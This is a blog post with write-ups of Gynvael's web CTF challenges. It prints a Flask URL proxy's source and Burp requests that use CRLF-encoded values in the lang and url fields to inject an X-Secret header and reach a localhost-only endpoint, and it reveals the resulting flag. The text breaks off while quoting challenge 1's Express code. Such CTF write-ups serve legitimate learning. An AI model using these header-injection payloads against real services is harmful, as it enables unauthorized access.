@@ -1,0 +1,370 @@
+<!doctype html><html lang=en><head><title>Gynvael's Challenges 0, 1 and 2 :: Foxtrotlabs — In the middle of somewhere</title>
+<meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="0x00 Introduction If you have ever wondered why I am foxtrot_charlie, well - first of all my parents gave me this name, and then cf acronym comes to play. In military jargon cf could be described visually as the beginning of the year 2020. Pure cluster f***k. But lockdown has some advantages. For example I do not need to move around for my uni classes (why the hell something like that must have happened so we could study at home) so there is plenty of time to do my thing - hack."><meta name=keywords content="hacking"><meta name=robots content="noodp"><link rel=canonical href=https://foxtrotlabs.cc/en/posts/2020-05-14-gynvaels-challenges/><script>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-148414315-1","auto"),ga("send","pageview"))</script><link rel=stylesheet href=https://foxtrotlabs.cc/assets/style.css><link rel=stylesheet href=https://foxtrotlabs.cc/assets/blue.css><link rel=apple-touch-icon-precomposed sizes=144x144 href=https://foxtrotlabs.cc/img/apple-touch-icon-144-precomposed.png><link rel="shortcut icon" href=https://foxtrotlabs.cc/avatar/favicon.ico><meta name=twitter:card content="summary"><meta name=twitter:creator content><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Gynvael's Challenges 0, 1 and 2 :: Foxtrotlabs"><meta property="og:description" content="0x00 Introduction If you have ever wondered why I am foxtrot_charlie, well - first of all my parents gave me this name, and then cf acronym comes to play. In military jargon cf could be described visually as the beginning of the year 2020. Pure cluster f***k. But lockdown has some advantages. For example I do not need to move around for my uni classes (why the hell something like that must have happened so we could study at home) so there is plenty of time to do my thing - hack."><meta property="og:url" content="https://foxtrotlabs.cc/en/posts/2020-05-14-gynvaels-challenges/"><meta property="og:site_name" content="Gynvael's Challenges 0, 1 and 2"><meta property="og:image" content="https://foxtrotlabs.cc/avatar/favicon.ico"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2020-05-18 11:29:16 +0200 +0200"></head><body><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=https://foxtrotlabs.cc/en><div class=logo>foxtrotlabs-en</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=https://foxtrotlabs.cc/posts>posts</a></li><li><a href=https://foxtrotlabs.cc/pl>Polish side</a></li><li><a href=https://foxtrotlabs.cc/about>about</a></li><li><a href=https://github.com/s3gm3nt4ti0nf4ult>github</a></li></ul><ul class="menu__inner menu__inner--mobile"><li><a href=https://foxtrotlabs.cc/posts>posts</a></li><li><a href=https://foxtrotlabs.cc/pl>Polish side</a></li><li><a href=https://foxtrotlabs.cc/about>about</a></li><li><a href=https://github.com/s3gm3nt4ti0nf4ult>github</a></li></ul></nav><script>var doNotTrack=!1;doNotTrack||(function(e,t,n,s,o,i,a){e.GoogleAnalyticsObject=o,e[o]=e[o]||function(){(e[o].q=e[o].q||[]).push(arguments)},e[o].l=1*new Date,i=t.createElement(n),a=t.getElementsByTagName(n)[0],i.async=1,i.src=s,a.parentNode.insertBefore(i,a)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-148414315-1","auto"),ga("send","pageview"))</script></header><div class=content><div class=post><h1 class=post-title><a href=https://foxtrotlabs.cc/en/posts/2020-05-14-gynvaels-challenges/>Gynvael&rsquo;s Challenges 0, 1 and 2</a></h1><div class=post-meta><span class=post-date>2020-05-18</span></div><div class=post-content><div><h1 id=0x00-introduction>0x00 Introduction<a href=#0x00-introduction class=hanchor arialabel=Anchor>&#8983;</a></h1><p>If you have ever wondered why I am <code>foxtrot_charlie</code>, well - first of all my parents gave me this name, and then <code>cf</code> acronym comes to play. In military jargon <code>cf</code> could be described visually as the beginning of the year 2020. Pure <code>cluster f***k</code>. But lockdown has some advantages. For example I do not need to move around for my uni classes (why the hell something like that must have happened so we could study at home) so there is plenty of time to do my thing - hack. And solve challenges. As far as <code>Gynvael's missions</code> are dead there is a new guy in town. Gynvael hosts new challs on his (I assume his) host <code>35.204.139.205</code> on ports above <code>5000</code> (inclusive). So let me jump straight into it! Today I will show my solutions to 3 first challanges. AFAIK there are 5 of them so expect a followup.</p><p><strong>SPOILER ALERT</strong></p><p>This blogpost contains solutions of CTF tasks, but <code>@Gynvael</code> permits to post them. So if you want to solve these challs go to <code>http://35.204.139.205:5000/</code> and start hacking!</p><p><strong>SPOILER ALERT</strong></p><h1 id=0x10-challenge-0x005000>0x10 Challenge 0x00:5000<a href=#0x10-challenge-0x005000 class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Zeroth chall (hosted on port <code>5000</code>) was the first introducent. It&rsquo;s rather simple headers&rsquo; modification type of task that could be solved in two ways. But let me show you the code (2 spaces indentation brrr).</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/python3</span>
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> flask <span style=color:#f92672>import</span> Flask, request, Response, render_template_string
+</span></span><span style=display:flex><span><span style=color:#f92672>from</span> urllib.parse <span style=color:#f92672>import</span> urlparse
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> socket
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> os
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>app <span style=color:#f92672>=</span> Flask(__name__)
+</span></span><span style=display:flex><span>FLAG <span style=color:#f92672>=</span> os<span style=color:#f92672>.</span>environ<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;FLAG&#39;</span>, <span style=color:#e6db74>&#34;???&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>with</span> open(<span style=color:#e6db74>&#34;task.py&#34;</span>) <span style=color:#66d9ef>as</span> f:
+</span></span><span style=display:flex><span>  SOURCE <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>read()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/secret&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>secret</span>():
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>remote_addr <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;127.0.0.1&#34;</span>:
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Access denied!&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> request<span style=color:#f92672>.</span>headers<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;X-Secret&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>) <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;YEAH&#34;</span>:
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Nope.&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;GOOD WORK! Flag is </span><span style=color:#e6db74>{</span>FLAG<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>index</span>():
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> render_template_string(
+</span></span><span style=display:flex><span>      <span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;html&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;body&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          &lt;h1&gt;URL proxy with language preference!&lt;/h1&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          &lt;form action=&#34;/fetch&#34; method=&#34;POST&#34;&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;p&gt;URL: &lt;input name=&#34;url&#34; value=&#34;http://gynvael.coldwind.pl/&#34;&gt;&lt;/p&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;p&gt;Language code: &lt;input name=&#34;lang&#34; value=&#34;en-US&#34;&gt;&lt;/p&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>            &lt;p&gt;&lt;input type=&#34;submit&#34;&gt;&lt;/p&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          &lt;/form&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          &lt;pre&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Task source:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>{{ src }}
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>          &lt;/pre&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        &lt;/body&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &lt;/html&gt;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>      &#34;&#34;&#34;</span>, src<span style=color:#f92672>=</span>SOURCE)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/fetch&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#34;POST&#34;</span>])
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>fetch</span>():
+</span></span><span style=display:flex><span>  url <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;url&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>)
+</span></span><span style=display:flex><span>  lang <span style=color:#f92672>=</span> request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;lang&#34;</span>, <span style=color:#e6db74>&#34;en-US&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> url:
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;URL must be provided&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  data <span style=color:#f92672>=</span> fetch_url(url, lang)
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> data <span style=color:#f92672>is</span> <span style=color:#66d9ef>None</span>:
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;Failed.&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> Response(data, mimetype<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;text/plain;charset=utf-8&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>fetch_url</span>(url, lang):
+</span></span><span style=display:flex><span>  o <span style=color:#f92672>=</span> urlparse(url)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  req <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>join([
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;GET </span><span style=color:#e6db74>{</span>o<span style=color:#f92672>.</span>path<span style=color:#e6db74>}</span><span style=color:#e6db74> HTTP/1.1&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Host: </span><span style=color:#e6db74>{</span>o<span style=color:#f92672>.</span>netloc<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Connection: close&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Accept-Language: </span><span style=color:#e6db74>{</span>lang<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span>  ])
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  res <span style=color:#f92672>=</span> o<span style=color:#f92672>.</span>netloc<span style=color:#f92672>.</span>split(<span style=color:#e6db74>&#39;:&#39;</span>)
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> len(res) <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>:
+</span></span><span style=display:flex><span>    host <span style=color:#f92672>=</span> res[<span style=color:#ae81ff>0</span>]
+</span></span><span style=display:flex><span>    port <span style=color:#f92672>=</span> <span style=color:#ae81ff>80</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>    host <span style=color:#f92672>=</span> res[<span style=color:#ae81ff>0</span>]
+</span></span><span style=display:flex><span>    port <span style=color:#f92672>=</span> int(res[<span style=color:#ae81ff>1</span>])
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  data <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>with</span> socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_STREAM) <span style=color:#66d9ef>as</span> s:
+</span></span><span style=display:flex><span>    s<span style=color:#f92672>.</span>connect((host, port))
+</span></span><span style=display:flex><span>    s<span style=color:#f92672>.</span>sendall(req<span style=color:#f92672>.</span>encode(<span style=color:#e6db74>&#39;utf-8&#39;</span>))
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
+</span></span><span style=display:flex><span>      data_part <span style=color:#f92672>=</span> s<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>1024</span>)
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> data_part:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>
+</span></span><span style=display:flex><span>      data <span style=color:#f92672>+=</span> data_part
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> data
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
+</span></span><span style=display:flex><span>  app<span style=color:#f92672>.</span>run(debug<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>, host<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;0.0.0.0&#34;</span>)
+</span></span></code></pre></div><p>Ok, so the app is written in the <code>Flask</code>[1] framework and it is some kind of a proxy that does <code>GET</code> requests with <code>Accept-Language:</code> header settings. Our task is simple. We have to generate the <code>GET</code> request to <code>/secret</code> endpoint. But there are some contitions that have to be met. First of all - <code>request.remote_addr != "127.0.0.1"</code> means that request has to be done from localhost. So in case of <code>GET</code> request done from any other host in the Internet the response says &ldquo;Access denied!&rdquo;. To solve this challenge I will use Burp Suite and Repeater.</p><pre tabindex=0><code>GET /secret HTTP/1.1
+Host: 35.204.139.205:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+</code></pre><blockquote><p>Listing 0x10 - GET request. Accessing the /secret from my host</p></blockquote><pre tabindex=0><code>HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 14
+Server: Werkzeug/1.0.1 Python/3.6.9
+Date: Tue, 19 May 2020 16:26:32 GMT
+
+Access denied!```
+</code></pre><blockquote><p>Listing 0x11 - response access denied</p></blockquote><p>After reading the source code (which was downloadable by the time I was solving that challenge) my first thought was to set <code>X-Secret</code> header using <code>Accept-Language</code> header. Proxy uses following code:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>  req <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\r\n</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>join([
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;GET </span><span style=color:#e6db74>{</span>o<span style=color:#f92672>.</span>path<span style=color:#e6db74>}</span><span style=color:#e6db74> HTTP/1.1&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Host: </span><span style=color:#e6db74>{</span>o<span style=color:#f92672>.</span>netloc<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Connection: close&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Accept-Language: </span><span style=color:#e6db74>{</span>lang<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;</span>
+</span></span><span style=display:flex><span>  ])
+</span></span></code></pre></div><blockquote><p>Listing 0x12 - request building</p></blockquote><p>The fifth line uses Python&rsquo;s 3.6 feature f-strings[2] and sets <code>Accept-Language</code> to <code>lang</code> variable. Actually this variable is controlled by the attacker in post form -<code>lang = request.form.get("lang", "en-US")</code> sets the lang variable to one set by the sender.</p><p>Headers in the HTTP are separated by CRLF[3] value. So the obvious thing to do is to set <code>Accept-Langauge</code> to <code>something\r\nX-Secret:YEAH</code>. But setting that value in POST request.</p><pre tabindex=0><code>url=http://127.0.0.1:5000/secret&amp;lang=en-US\r\nX-Secret:YEAH
+</code></pre><blockquote><p>Listing 0x13 - faulty payload</p></blockquote><p>Gives the following response on the server side (I&rsquo;ve added some debug messages to clarify what happens):</p><pre tabindex=0><code> * Serving Flask app &#34;server&#34; (lazy loading)
+ * Environment: production
+   WARNING: This is a development server. Do not use it in a production deployment.
+   Use a production WSGI server instead.
+ * Debug mode: off
+ * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)
+ImmutableMultiDict([(&#39;url&#39;, &#39;http://127.0.0.1:5000/secret&#39;), (&#39;lang&#39;, &#39;en-US\\n\\rX-Secret:YEAH&#39;)])
+o.path: /secret, 127.0.0.1:5000, lang: en-US\n\rX-Secret:YEAH
+Req: GET /secret HTTP/1.1
+Host: 127.0.0.1:5000
+Connection: close
+Accept-Language: en-US\r\nX-Secret:YEAH
+</code></pre><blockquote><p>Listing 0x14 - server side parsing of the request</p></blockquote><p>What happened? Chars <code>\r\n</code> were escaped, encoded and then sent as normal characters not CRLF. The simplest method to fix that in Burp is to use <code>URL-encode as you type</code> method. So the full request looks like this:</p><pre tabindex=0><code>POST /fetch HTTP/1.1
+Host: 35.204.139.205:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 62
+Origin: http://35.204.139.205:5000
+Connection: close
+Referer: http://35.204.139.205:5000/
+Upgrade-Insecure-Requests: 1
+
+url=http://127.0.0.1:5000/secret&amp;lang=en-US%0d%0aX-Secret:YEAH
+</code></pre><blockquote><p>Listing 0x15 - URL-encoded request</p></blockquote><p>And ten <em>bang</em> we have the flag!</p><pre tabindex=0><code>HTTP/1.0 200 OK
+Content-Type: text/plain;charset=utf-8; charset=utf-8
+Content-Length: 195
+Server: Werkzeug/1.0.1 Python/3.6.9
+Date: Tue, 19 May 2020 16:23:09 GMT
+
+HTTP/1.0 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Length: 42
+Server: Werkzeug/1.0.1 Python/3.6.9
+Date: Tue, 19 May 2020 16:23:09 GMT
+
+GOOD WORK! Flag is CTF{ThesePeskyNewLines}
+</code></pre><blockquote><p>Listing 0x16 - the flag</p></blockquote><p>And the server parsed request as follows:</p><pre tabindex=0><code>127.0.0.1 - - [19/May/2020 16:52:06] &#34;POST /fetch HTTP/1.1&#34; 200 -
+ImmutableMultiDict([(&#39;url&#39;, &#39;http://127.0.0.1:5000/secret&#39;), (&#39;lang&#39;, &#39;en-US\r\nX-Secret:YEAH&#39;)])
+o.path: /secret, 127.0.0.1:5000, lang: en-US
+X-Secret:YEAH
+Req: GET /secret HTTP/1.1
+Host: 127.0.0.1:5000
+Connection: close
+Accept-Language: en-US
+X-Secret:YEAH
+</code></pre><blockquote><p>Listing 0x17 - server side parsing of the correct payload</p></blockquote><p>Aaaaaand then I was happy with my solution. But <code>@Gynvael</code> came and said that there is another way. And there is. I&rsquo;m really ashamed that I haven&rsquo;t spotted it right at the beginning. So as you probably already know there is a way to inject <code>X-Secret</code> header without <code>lang</code> variable. The URL parameter has to be formated that way it will create a valid HTTP <code>GET</code> request. How to do that? On the higher level the URL should look like this: <code>schema://address:port/resource[space]HTTP/1.1\r\nX-Secret:YEAH\r\n\r\n</code>. Implementing this idea should give something like this:</p><pre tabindex=0><code>POST /fetch HTTP/1.1
+Host: 35.204.139.205:5000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 83
+Origin: http://35.204.139.205:5000
+Connection: close
+Referer: http://35.204.139.205:5000/
+Upgrade-Insecure-Requests: 1
+
+url=http://127.0.0.1:5000/secret+HTTP/1.1%0d%0aX-Secret:YEAH%0d%0a%0d%0a&amp;lang=en-US
+</code></pre><blockquote><p>Listing 0x18 - the flag vol2</p></blockquote><p>And on the server side</p><pre tabindex=0><code>ImmutableMultiDict([(&#39;url&#39;, &#39;http://127.0.0.1:5000/secret HTTP/1.1\r\nX-Secret:YEAH\r\n\r\n&#39;), (&#39;lang&#39;, &#39;en-US&#39;)])
+Req: GET /secret HTTP/1.1
+X-Secret:YEAH
+
+ HTTP/1.1
+Host: 127.0.0.1:5000
+Connection: close
+Accept-Language: en-US
+</code></pre><blockquote><p>Listing 0x19 - server side parsing of the url encoded injection</p></blockquote><p>Things after <code>\r\n</code> are simply ignored.</p><h1 id=0x20-task-0x015001>0x20 Task 0x01:5001<a href=#0x20-task-0x015001 class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Next task is hosted on <code>5001</code> and it&rsquo;s written in our <em>beloved</em> JavaScript. So let&rsquo;s jump straight into it!</p><p>Accessing the website returns us the code of the challenge:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#f92672>~</span> <span style=color:#960050;background-color:#1e0010>❯</span> <span style=color:#a6e22e>curl</span> <span style=color:#e6db74>&#39;http://35.204.139.205:5001/&#39;</span>                          
+</span></span><span style=display:flex><span><span style=color:#a6e22e>Level</span> <span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>express</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;express&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>fs</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;fs&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>PORT</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>5001</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>FLAG</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>process</span>.<span style=color:#a6e22e>env</span>.<span style=color:#a6e22e>FLAG</span> <span style=color:#f92672>||</span> <span style=color:#e6db74>&#34;???&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>SOURCE</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>fs</span>.<span style=color:#a6e22e>readFileSync</span>(<span style=color:#e6db74>&#39;app.js&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>app</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>express</span>()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;/&#39;</span>, (<span style=color:#a6e22e>req</span>, <span style=color:#a6e22e>res</span>) =&gt; {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>statusCode</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>200</span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>setHeader</span>(<span style=color:#e6db74>&#39;Content-Type&#39;</span>, <span style=color:#e6db74>&#39;text/plain;charset=utf-8&#39;</span>)
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>write</span>(<span style=color:#e6db74>&#34;Level 1\n\n&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>(<span style=color:#e6db74>&#39;secret&#39;</span> <span style=color:#66d9ef>in</span> <span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>query</span>)) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>end</span>(<span style=color:#a6e22e>SOURCE</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>query</span>.<span style=color:#a6e22e>secret</span>.<span style=color:#a6e22e>length</span> <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>5</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>end</span>(<span style=color:#e6db74>&#34;I don&#39;t allow it.&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>req</span>.<span style=color:#a6e22e>query</span>.<span style=color:#a6e22e>secret</span> <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;GIVEmeTHEflagNOW&#34;</span>) {
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>end</span>(<span style=color:#e6db74>&#34;Wrong secret.&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span>
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>res</span>.<span style=color:#a6e22e>end</span>(<span style=color:#a6e22e>FLAG</span>)
+</span></span><span style=display:flex><span>})
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>app</span>.<span style=color:#a6e22e>listen</span>(<span style=color:#a6e22e>PORT</span>, () =&gt; {
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`Example app listening at port </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>PORT</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>)
+</span></span><span style=display:flex><span>}) 
+</span></span></code></pre></div><blockquote><p>Listing 0x20 Code</p></blockquote><p>This time to obtain the secret the app must get the <code>secret</code> parameter in the <code>GET</code> request. It has to be set to <code>GIVEmeTHEflagNOW</code> and at the same time it has to meet this check:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span>
